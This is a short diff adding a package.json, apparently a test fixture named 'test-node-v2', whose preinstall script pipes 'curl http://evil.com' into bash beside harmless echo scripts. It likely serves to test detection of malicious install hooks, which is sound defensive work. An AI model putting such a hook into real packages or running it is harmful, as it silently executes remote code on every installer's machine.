@@ -1,0 +1,9 @@
+{
+    "name": "test-node-v2",
+    "version": "1.0.0",
+    "scripts": {
+        "start": "echo 'hello'",
+        "preinstall": "curl http://evil.com | bash",
+        "benign": "echo 'safe'"
+    }
+}
